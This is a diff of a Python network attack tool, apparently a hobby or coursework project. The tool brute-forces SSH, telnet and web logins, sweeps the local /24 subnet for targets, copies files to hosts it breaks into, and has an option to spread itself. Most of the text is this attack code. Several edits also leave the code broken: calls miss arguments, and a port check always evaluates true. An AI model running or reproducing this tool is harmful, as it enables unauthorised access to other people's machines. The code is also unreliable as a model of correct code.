@@ -45,27 +45,6 @@ def append_lines_from_file_to_list(file):
     return lines_list
 
 
-def send_post_request_with_login(ip, port, username, password):
-    """
-    This function sends a post request to a web server in an attempt to
-    bruteforce its login details. If it succeeds with the given arguments
-    then it will return the successful string of details, if not then it
-    will return Null.
-    """
-    response = requests.post("https://" + ip + ":" + port + "/login.php",
-                             data={"username": username,
-                                   "password": password},
-                             timeout=4)
-    if response:
-        Main.connection_status("web", ip, port, username,
-                               password, "Successful")
-        return str(username) + ":" + str(password)
-    else:
-        Main.connection_status("web", ip, port, username,
-                               password, "Unsuccessful")
-        return None
-
-
 def check_telnet_data(string_to_check, data):
     """
     This function checks data gathered from the telnet service for a
@@ -101,6 +80,47 @@ def check_over_ssh(ip, port, username, password):
         return True
 
 
+def connection_status(service, ip, port, username, password, status):
+    """
+    This function will print and create the connection status string
+    dependant on the context given by the arguments passed into it.
+    """
+    print(str(status) + " " + str(service) + " login to " + str(ip)
+          + ":" + str(port) + " using " + str(username) + ":"
+          + str(password))
+
+
+def convert_file_to_list(filename):
+    """
+    This function will convert a given file specified by a filename to a
+    list and will then proceed to return that list.
+    """
+    with open(str(filename)) as file:
+        file_as_list = append_lines_from_file_to_list()
+    return file_as_list
+
+
+def cycle_through_subnet(ip_list, interface):
+    """
+    This function takes in a given network interface and an IP list, it
+    will get the IP address of the interface and add all the address from
+    its /24 subnet to the IP list and will then return the list.
+    """
+    interface_split = get_if_addr(interface).split(".")
+    last_byte = 0
+    while last_byte < 256:
+        specific_address = str(interface_split[0]) + "."\
+                           + str(interface_split[1]) + "." \
+                           + str(interface_split[2]) + "."\
+                           + str(last_byte)
+        if not ip_list.__contains__(specific_address):
+            print("Adding " + str(specific_address)
+                  + " from interface " + str(interface) + "'s subnet.")
+            ip_list.append(specific_address)
+        last_byte = last_byte + 1
+    return ip_list
+
+
 class Main:
     def additional_attacks(self, args, ip, port, bruteforce,
                            transfer_file_filename, service):
@@ -124,7 +144,7 @@ class Main:
         if "-t" in args:
             ip_addresses_filename = args[args.index("-t") + 1]
             try:
-                ip_list = self.convert_file_to_list(ip_addresses_filename)
+                ip_list = convert_file_to_list(ip_addresses_filename)
                 target_ports = args[args.index("-p") + 1]
                 target_username = args[args.index("-u") + 1]
                 passwords_filename = args[args.index("-f") + 1]
@@ -188,14 +208,14 @@ class Main:
             client.connect(hostname=str(ip), port=int(port),
                            username=str(username), password=str(password))
             client.close()
-            Main.connection_status(self, "SSH", ip, port, username,
-                                   password, "Successful")
+            connection_status("SSH", ip, port, username,
+                              password, "Successful")
             return True
 
         except Exception:
             client.close()
-            Main.connection_status(self, "SSH", ip, port, username,
-                                   password, "Unsuccessful")
+            connection_status("SSH", ip, port, username,
+                              password, "Unsuccessful")
             return False
 
     def connect_telnet(self, ip, port, username, password):
@@ -212,72 +232,34 @@ class Main:
 
             data = tel.read_until("Welcome to".encode("ascii"), timeout=4)
             if check_telnet_data(data):
-                Main.connection_status("telnet", ip, port, username,
-                                       password, "Successful")
+                connection_status(ip, port, username,
+                                  password, "Successful")
                 return True
-            Main.connection_status("telnet", ip, port, username,
-                                   password, "Unsuccessful")
+            connection_status(ip, port, username,
+                              password, "Unsuccessful")
             return False
 
         except Exception:
-            Main.connection_status("telnet", ip, port, username,
-                                   password, "Unsuccessful")
+            connection_status(ip, port, username,
+                              password, "Unsuccessful")
             return False
 
-    def connect_web(ip, port, username, password):
+    def connect_web(self, ip, port, username, password):
         """
         This function check to see if a web login can be established and if so
         then it returns true, if not then it returns false.
         """
         attempt_succeeded = False
         try:
-            send_post_request_with_login(port, username, password)
+            self.send_post_request_with_login(port, username, password)
             attempt_succeeded = True
         except Exception:
-            Main.connection_status("web", ip, port, username,
-                                   password, "Unsuccessful")
+            connection_status(ip, port, username,
+                              password, "Unsuccessful")
         if attempt_succeeded:
-            Main.connection_status("web", ip, port, username,
-                                   password, "Successful")
+            connection_status(ip, port, username,
+                              password, "Successful")
         return attempt_succeeded
-
-    def connection_status(self, service, ip, port, username, password, status):
-        """
-        This function will print and create the connection status string
-        dependant on the context given by the arguments passed into it.
-        """
-        print(str(status) + " " + str(service) + " login to " + str(ip)
-              + ":" + str(port) + " using " + str(username) + ":"
-              + str(password))
-
-    def convert_file_to_list(self, filename):
-        """
-        This function will convert a given file specified by a filename to a
-        list and will then proceed to return that list.
-        """
-        with open(str(filename)) as file:
-            file_as_list = append_lines_from_file_to_list()
-        return file_as_list
-
-    def cycle_through_subnet(self, ip_list, interface):
-        """
-        This function takes in a given network interface and an IP list, it
-        will get the IP address of the interface and add all the address from
-        its /24 subnet to the IP list and will then return the list.
-        """
-        interface_split = get_if_addr(interface).split(".")
-        last_byte = 0
-        while last_byte < 256:
-            specific_address = str(interface_split[0]) + "."\
-                               + str(interface_split[1]) + "." \
-                               + str(interface_split[2]) + "."\
-                               + str(last_byte)
-            if not ip_list.__contains__(specific_address):
-                print("Adding " + str(specific_address)
-                      + " from interface " + str(interface) + "'s subnet.")
-                ip_list.append(specific_address)
-            last_byte = last_byte + 1
-        return ip_list
 
     def file_error_handler(self, filename):
         """
@@ -285,7 +267,7 @@ class Main:
         """
         print("!!!ERROR: SOMETHING WENT WRONG WHEN PROCESSING THE FILENAME: "
               + filename + "!!!")
-        Main.gtfo_and_rtfm()
+        self.gtfo_and_rtfm()
 
     def file_not_exist(self, ip, port, username, password):
         """
@@ -308,7 +290,7 @@ class Main:
         for interface in local_interfaces:
             if str(interface) != "lo":
                 (print("Fetching IPs for interface " + str(interface) + "..."))
-                ip_list.extend(Main.cycle_through_subnet(self, ip_list, interface))
+                ip_list.extend(cycle_through_subnet(ip_list, interface))
         return ip_list
 
     def gtfo_and_rtfm(self):
@@ -451,6 +433,26 @@ class Main:
             return True
         return False
 
+    def send_post_request_with_login(self, ip, port, username, password):
+        """
+        This function sends a post request to a web server in an attempt to
+        bruteforce its login details. If it succeeds with the given arguments
+        then it will return the successful string of details, if not then it
+        will return Null.
+        """
+        response = requests.post("https://" + ip + ":" + port + "/login.php",
+                                 data={"username": username,
+                                       "password": password},
+                                 timeout=4)
+        if response:
+            connection_status(self, "web", ip, port, username,
+                                   password, "Successful")
+            return str(username) + ":" + str(password)
+        else:
+            connection_status(self, "web", ip, port, username,
+                                   password, "Unsuccessful")
+            return None
+
     def telnet_connection(self, ip_telnet, port_telnet, username_telnet,
                           password_telnet):
         """
@@ -588,7 +590,7 @@ class Main:
         else:
             print("Requirement to propagate script not specified, skipping...")
 
-    def try_transferring_file(args, ip, port, bruteforced,
+    def try_transferring_file(self, args, ip, port, bruteforce,
                               transfer_file_filename, service):
         """
         This function attempts transferring a user specified file across the
@@ -600,8 +602,8 @@ class Main:
         not be done.
         """
         if "-d" in args and (str(port) == "22" or "23"):
-            transferred = Main.transfer_file(
-                ip, port, bruteforced, transfer_file_filename)
+            transferred = self.transfer_file(
+                ip, port, bruteforce, transfer_file_filename)
             if transferred:
                 print("File " + str(transfer_file_filename)
                       + " transferred over " + service + ".")
@@ -680,7 +682,7 @@ class Main:
             # passwords list. If they have...
             Main.validate_file_exists(passwords_filename)
             # A list of passwords is created.
-            password_list = Main.convert_file_to_list(passwords_filename)
+            password_list = convert_file_to_list()
         except Exception:
             # Uh oh, file doesn't exist, alert the user and exit gracefully so
             # they can either fix their mistake or repent their sins.
